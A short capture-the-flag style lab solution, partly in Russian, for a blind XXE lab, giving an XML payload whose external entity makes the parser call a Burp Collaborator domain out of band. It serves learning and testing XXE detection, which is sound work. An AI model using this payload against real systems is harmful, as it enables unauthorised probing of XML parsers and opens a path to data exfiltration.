# Blind XXE with out-of-band interaction
PRACTITIONER

This lab has a "Check stock" feature that parses XML input but does not display the result.

You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

## Решение
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE any [<!ENTITY dummy SYSTEM "http://b5hhxsbuc5fdx2cfvs4hyur9k0qreh26.oastify.com">]>
<stockCheck>
<productId>1</productId>
<storeId>&dummy;</storeId>
</stockCheck>
```
Задание выполнено.
